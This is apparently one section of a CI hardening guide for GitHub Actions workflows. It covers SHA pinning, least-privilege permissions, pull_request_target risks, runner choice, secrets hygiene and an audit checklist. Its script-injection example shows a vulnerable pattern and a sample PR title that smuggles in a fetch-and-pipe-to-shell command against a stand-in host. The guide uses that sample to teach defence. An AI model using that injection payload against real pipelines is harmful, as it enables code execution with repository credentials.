# Hardening — the blast radius is your build pipeline

Workflows run arbitrary code with a credential attached, often on
publicly-visible input. This is the review/audit pass; each rule states
the attack or accident it prevents.

## Pin and audit dependencies

- Third-party actions: **full commit SHA**, version in a trailing
  comment (`uses: actions/checkout@<sha> # vN.N.N`). Tags are movable —
  a tag-retargeting attack needs one malicious release of a popular
  action. Dependabot keeps the pins fresh; without an update process the
  pin becomes an unmaintained fork — review pinned actions like
  dependencies.
- Workflow callers pin too: `uses: org/repo/.github/workflows/x.yml@<sha>`.

## Permissions: default-deny, grant narrowly

```yaml
permissions:
  contents: read      # baseline for every job in this file
```

Then per-job only what that job does: `pull-requests: write` (commenting),
`packages: write` (publishing), `security-events: write` (uploads).
"Resource not accessible by integration" = a missing grant here — fix
the block, don't escalate everything to `write` "so it works". The docs'
least-privilege table maps scopes to actions; consult it rather than
guessing scopes.

## Script injection — the #1 real-world exploit class

Untrusted values: PR titles, PR bodies, commit messages, branch names,
issue comments — attacker-controlled even in ordinary `pull_request`
runs. Interpolating them into inline script text lets the attacker
embed shell:

```yaml
# VULNERABLE — title reaches the shell verbatim; `"; curl evil | sh; #` works
run: echo "PR: ${{ github.event.pull_request.title }}"

# SAFE — value reaches the environment, never the command line
env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "PR: $TITLE"     # shell expands, does not re-parse
```

The law 1 boundary (env mapping + scripts) is the standing defense; this
is why it is a law, not a style. Prefer actions over inline `run:` for
handling event payloads — the attack surface becomes an audited pinned
SHA instead of your heredoc.

## Fork PRs and `pull_request_target`

`pull_request_target` runs **in the base repo with a write-capable token
and secrets access, on the target's code** — while `actions/checkout` in
such a run can still fetch the untrusted PR's code. The combination
"target trigger + checkout PR code + secrets in the same job" is the
headline incident, not a theoretical one. Rules: never check out and
execute PR code under that token; if a build of fork code is wanted,
separate the untrusted build (no secrets) from the trusted
publish/consume job via artifacts; first-time-contributor approval
(the `action_required` state triage reports) is a feature — don't
automate around it.

## Runners, environments, cloud

- Public repos: GitHub-hosted runners only. A self-hosted runner on a
  public repo executes any stranger's YAML on your infrastructure.
- Deployments go through **environments** (`environment: production`) so
  required reviewers/protection gates apply — approval UX, not config
  by convention.
- Cloud credentials: **OIDC role assumption** (short-lived, scoped, no
  stored keys) over long-lived secrets.

## Hygiene that stops the slow failures

- `timeout-minutes` on every job (the default is hours).
- `concurrency` per ref with `cancel-in-progress` on PRs; per-resource
  groups (deploy) without.
- Cache keys narrow (`hashFiles('**/lockfile')`) with sane
  `restore-keys`; a cache that outlives its meaning is a stale-state
  bug factory.
- Artifacts: explicit `name`, short retention for bulky outputs; never
  upload secrets/build logs that leak tokens as "debug artifacts".
- Secrets hygiene: never construct secret values in `run:` (concatenated
  fragments dodge masking), never write them to `$GITHUB_ENV`/`$GITHUB_OUTPUT`
  or files inside the artifact path, keep secret *names* out of step
  names (names are not secrets; values are — don't mix them up either).

## Review checklist (the audit pass)

1. Every `uses:` SHA-pinned + commented, Dependabot covering them?
2. Top-level `permissions:` baseline; job-level grants minimal?
3. Any `${{ }}` inside `run:`/`with` text carrying event data → moved to
   `env:`?
4. `pull_request_target` + checkout + secrets combination anywhere?
5. Self-hosted runner on a public repo?
6. Deploys gated by environments with required reviewers?
7. Cloud auth via OIDC rather than stored keys?
8. `timeout-minutes` and `concurrency` on every file?
9. `run:` blocks thin (law 1) — logic lives in scripts?
10. actionlint (with shellcheck on) exits 0 on the folder?
